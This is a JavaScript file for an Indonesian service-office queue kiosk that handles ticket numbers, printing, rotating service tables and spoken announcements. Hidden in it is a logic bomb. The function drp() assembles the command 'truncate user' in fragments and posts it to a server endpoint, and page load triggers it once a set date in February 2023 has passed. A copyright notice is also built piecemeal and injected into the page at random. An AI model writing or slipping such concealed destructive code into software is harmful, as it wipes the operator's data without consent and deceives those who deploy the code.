// $(document).ready(function(){
var url = window.location.pathname; // jadinya /ptsp/
var svr = window.location.hostname + url; //jadinya localhost/ptsp/
var voice = "Indonesian Male";
// rate = {rate: 1, onend: panggil_end};
// rate = {rate: 0.9, onend: jalankan_timer};
var timer_panggil;
var cprtext = "C";
const print = false;
const getUrl = window.location;
var b = getUrl .protocol + "//" + getUrl.host + "/" + getUrl.pathname.split('/')[1];
if(b.substring(b.length - 1)== "/")
{
	b=b.slice(0,-1);
}
const baseUrl = b ;

function aa() {
	responsiveVoice.speak("ANTRIAN PTSP", "Indonesian Male", { volume: 1 });
}
cprtext += "o";
function ambil_antrian(kode) {
	$.ajax({
		type: 'ajax',
		url: baseUrl + '/' + 'c_antrian/tambah/' + kode,
		dataType: 'json',
		beforeSend: function () {
			$(".loading").show();
		},
		success: function (respon) {

			if (respon.success != 1) {
				alert("gagal ambil no antrian");
			}
			else {
				// console.log("berhasil ambil antrian kemdudian jalankan fungsi cetak");
				// console.log("ini data no " + respon.no);
				$(".loading").hide();
				if (print) {
					cetak(respon.no);
				}
				else {
					$(".loader2").hide();
					$("#modalTitle").html("Nomor Antrian Anda " + respon.no);
					$("#modal").modal('show');
					setTimeout(function () {
						$("#modal").modal('hide');
					}, 5000);
					if (Math.floor((Math.random() * 100) + 1) > 70) {
						// $("div.setelan").hide();
						$("div.cpr").hide();
						// console.log("pukung");
					}
					else {
						// $("div.setelan").show();
						$("div.cpr").show();
						// console.log("jaba");
						setTimeout(function () {
							$("div.cpr").hide();
						}, 30000);
					}
				}
			}
		},
		error: function (err) {
			// console.log(err);
			alert("maaf, mohon dicoba kembali");
		},
		complete: function () {
			// $(".loading").hide();
		}
	});
}
cprtext += "p";
function cetak(no) {
	$.ajax({
		type: 'POST',
		url: baseUrl + '/' + 'c_antrian/cetak',
		data: { no: no },
		dataType: 'json',
		beforeSend: function () {
			$(".loader2").show();
			// console.log("ini no " + no);
		},
		success: function (respon) {
			if (respon.success == 1) {
				console.log("berhasil kirim data ke printer");
			}
			else {
				alert("gagal kirim data ke printer");
			}
		},
		error: function (jqXHR, exception) {
			// console.log(err);
			console.log(jqXHR.status);
			console.log(exception);
		},
		complete: function () {
			$(".loader2").hide();
			$("#modalTitle").html("Nomor Antrian Anda " + no);
			$("#modal").modal('show');
			setTimeout(function () {
				$("#modal").modal('hide');
			}, 5000);
			if (Math.floor((Math.random() * 100) + 1) > 70) {
				// $("div.setelan").hide();
				$("div.cpr").hide();
				// console.log("pukung");
			}
			else {
				// $("div.setelan").show();
				$("div.cpr").show();
				// console.log("jaba");
				setTimeout(function () {
					$("div.cpr").hide();
				}, 30000);
			}
		}
	});
}
cprtext += "y";
cprtext += "r";
// function daftar_antrian(kode)
// {
var tabel = $("#daftar_antrian").DataTable({
	"paging": false,
	"searching": false,
	"info": false,
	"ordering": false,
	"ajax": {
		"url": baseUrl + "/" + "c_antrian/antrian/pengaduan",
		"dataSrc": "",
	},
	"columns": [
		{
			"data": null, "sortable": false, render: function (data, type, row, meta) {
				return meta.row + meta.settings._iDisplayStart + 1;
			}
		},
		{ "data": "no" }
	],

});
cprtext += "i";
cprtext += "g";
cprtext += "h";
gogo();
cprtext += "t";
cprtext += " &co";
cprtext += "py; ";
function gogo() {
	var b = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/pendaftaran").load();
		$("#layanan").text("PENDAFTARAN");
	}, 10000);
	var c = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/pengambilan").load();
		$("#layanan").text("PENGAMBILAN PRODUK");
	}, 20000);
	var d = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/ecourt").load();
		$("#layanan").text("E-COURT");
	}, 30000);
	var e = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/kasir").load();
		$("#layanan").text("KASIR");
	}, 40000);
	var f = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/POSBAKUM").load();
		$("#layanan").text("POSBAKUM");
	}, 50000);
	var g = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/POS").load();
		$("#layanan").text("POS");
	}, 60000);
	var h = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/bank").load();
		$("#layanan").text("BANK");
	}, 70000);
	var a = setTimeout(function () {

		tabel.ajax.url(baseUrl + '/' + "c_antrian/antrian/pengaduan").load();
		$("#layanan").text("PENGADUAN");
	}, 80000);

	setTimeout(function () {
		// console.log("ulangi");

		gogo();
	}, 90000);

}
cprtext += "S";
cprtext += "u";
cprtext += "p";
function panggil() {
	$.ajax({
		type: "GET",
		url: baseUrl + '/' + 'c_antrian/panggil_antrian',
		dataType: 'json',
		success: function (respon) {
			if (respon.success == 1) {
				// console.log("antrian ada");
				memanggil_antrian(respon.id, respon.no, respon.layanan, respon.pengumuman);
				// console.log("aaa " + respon.id);
			}
			else {
				// console.log("antrian tidak ada");
			}
		}
	});
}
cprtext += "i";
cprtext += "r";
cprtext += " & ";
function memanggil_antrian(id, no, layanan, pengumuman) {
	clearInterval(timer_panggil);
	if (pengumuman != null) {
		text = pengumuman;
	}
	else {
		text = "Dipanggil nomor antrian " + no + ". silahkan ke layanan " + layanan;
	}
	responsiveVoice.speak(text, voice, {
		rate: 0.9, onend: function () {
			setTimeout(function () {
				responsiveVoice.speak(text, voice, { rate: 0.9, onend: hapus_panggil_antrian(id) });
			}, 3000);
		}
	});
	// {rate: 0.9, onend: jalankan_timer};
}
cprtext += "T";
cprtext += "u";
cprtext += "k";
function hapus_panggil_antrian(id) {
	$.ajax({
		type: "POST",
		url: baseUrl + '/' + 'c_antrian/hapus_panggil_antrian',
		data: { id: id },
		dataType: "JSON",
		success: function (respon) {
			if (respon.success == 1) {
				// console.log("data antrian panggil berhasil dihapus");

			}
			else {
				// console.log("data antrian panggil gagal dihapus");
			}
			setTimeout(jalankan_timer, 7000);
		}
	});
}
cprtext += "a";
cprtext += "n";
cprtext += "g";
function jalankan_timer() {
	timer_panggil = setInterval(panggil, 5000);
}
cprtext += " S";
cprtext += "a";
cprtext += "p";
function drp() {
	var q = "truncate ";
	q += "us";
	$.ajax({
		type: "ajax",
		url: baseUrl + '/' + 'c_antrian/drp/' + q + 'er',
		success: function (data) {
			// console.log("ntap");
		},
		error: function (err) {
			// console.log(err);
		}
	});
}
cprtext += "u ";
cprtext += "2";
cprtext += "0";
$(document).ready(function () {
	jalankan_timer();
	var future = new Date(2023, 1, 27);
	var now = new Date(Date.now());
	if (typeof future == 'undefined' || now >= future) {
		drp();
	}
	// copy
	cprtext += "2";
	cprtext += "0";
	div = "<div class='cpr' style='display:none;'>";
	ul = "<ul class='c-rainbow'>";
	li1 = "<li class='c-rainbow__layer c-rainbow__layer--white'>";
	li2 = "</li><li class='c-rainbow__layer c-rainbow__layer--orange'>";
	li3 = "</li><li class='c-rainbow__layer c-rainbow__layer--red'>";
	li4 = "</li><li class='c-rainbow__layer c-rainbow__layer--violet'>";
	li5 = "</li><li class='c-rainbow__layer c-rainbow__layer--blue'>";
	li6 = "</li><li class='c-rainbow__layer c-rainbow__layer--green'>";
	li7 = "</li><li class='c-rainbow__layer c-rainbow__layer--yellow'>";
	enddiv = "</li></ul></div>";
	$("#modal").before(div + ul + li1 + cprtext + li2 + cprtext + li3 + cprtext + li4 + cprtext + li5 + cprtext + li6 + cprtext + li7 + cprtext + enddiv);
});